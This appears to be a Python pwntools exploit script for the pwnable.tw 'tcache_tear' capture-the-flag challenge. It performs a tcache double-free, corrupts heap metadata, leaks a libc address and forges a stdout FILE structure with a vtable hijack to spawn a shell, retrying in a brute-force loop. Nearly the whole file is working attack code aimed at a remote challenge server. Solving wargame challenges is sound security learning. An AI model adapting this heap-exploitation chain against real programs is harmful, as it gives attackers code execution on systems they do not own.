#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('tcache_tear_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)

# docker run --rm -v "$PWD":/pwn -w /pwn ubuntu:16.04 /bin/bash -c "apt-get update && apt-get install -y gcc && gcc house_of_force.c -o house_of_force_223 -no-pie"
# nc chall.pwnable.tw 10207
n=0
while True:
    n+=1
    info(f'Turn: {n}')
    if args.REMOTE:
        p = remote('chall.pwnable.tw', 10207)
    else:
        p = process([exe.path])
    try:
    
        # GDB()

        load = flat(
            0 ,0xa1,
            0, 0
        )

        sa(b'Name:', load)

        def add(size, data):
            sa(b'Your choice :', b'1')
            sna(b'Size:', size)
            sa(b'Data:', data)

        def rm():
            sa(b'Your choice :', b'2')
        add(0xf8, b'as')
        rm()
        rm()
        # brute at this
        add(0xf8, p16(0x3010)) # default: 0x3010
        add(0xf8, p64(0xdeadbeef))

        target = 0x602070
        set_up = 0x6024c0
        load = flat(
            p8(0x8)*12,
            b'\0'*(0x40-12),
            b'a'*0x30,
            set_up,
            target, # 0x80
            target, # 0x90
            # 0xa0
            target,
            target,
            target,
            target, # 0xd0


        )
        # # target: 0x603088

        add(0xf8, load)

        load = flat(
            b'a'*0x18,
            target,
        )
        load = load.ljust(0x98, b's')
        add(0xd8, load + p64(0x21)*7)


        add(0x98, b'ahihi')
        rm()

        sa(b'Your choice :', b'3')

        r(0x16)
        libc_leak  = u64(r(8))
        libc.address = libc_leak-0x3ebca0
        info(f'libc leak: {hex(libc_leak)}')
        info(f'libc base: {hex(libc.address)}')
        stdout = libc.sym._IO_2_1_stdout_
        final = flat(
            libc.sym.system,
            0x602458
        )
        add(0x78, final)

        add(0xf8, b'asiwdhw')

        rm()
        rm()
        add(0xf8, p64(stdout))
        add(0xf8, p64(0xdeadbeef))

        io = FileStructure()

        io.flags = 0x3b01010101010101
        io._IO_read_ptr = b'/bin/sh\0'
        io._lock = 0x602280
        io._wide_data = 0x602398
        io.vtable = libc.sym._IO_wfile_jumps_maybe_mmap+24-0x38
        # input()
        add(0xf8, bytes(io))

        sl(b'ls')
        a = p.recv(0x100)
        if b'home' or b'command not found' in a:
            break
        else:
            info(f'waiting')
            s = input("Waiting: ")
            if 'q' in s:
                break
            else:
                p.close()
                continue
    except EOFError:
        p.close()
        continue

p.interactive()

"""
 ► 0x155554e8425c <_IO_wdoallocbuf+28>    mov    rax, qword ptr [rax + 0x130]     RAX, [0x602518] => 0
   0x155554e84263 <_IO_wdoallocbuf+35>    call   qword ptr [rax + 0x68
"""


# 0x20 [  8]: 0x6161616161616161 ('aaaaaaaa')
# 0x30 [  8]: 0
# 0x40 [  8]: 0
# 0x50 [  8]: 0
# 0x60 [  8]: 0
# 0x70 [  8]: 0
# 0x80 [  8]: 0
# 0x90 [  8]: 0
# 0xa0 [  8]: 0
# 0xb0 [  8]: 0
# 0xc0 [  8]: 0
# 0xd0 [  8]: 0
# 0xe0 [  8]: 0
# 0xf0 [  8]: 0
# 0x100 [  8]: 0

"""
// By default there are 64 tcache bins
#define TCACHE_BINS 64
// The header of a heap chunk is 0x10 bytes in size
#define HEADER_SIZE 0x10

// This is the `tcache_perthread_struct` (or the tcache metadata)
struct tcache_metadata {
  char counts[TCACHE_BINS];
  void *entries[TCACHE_BINS];
};
"""

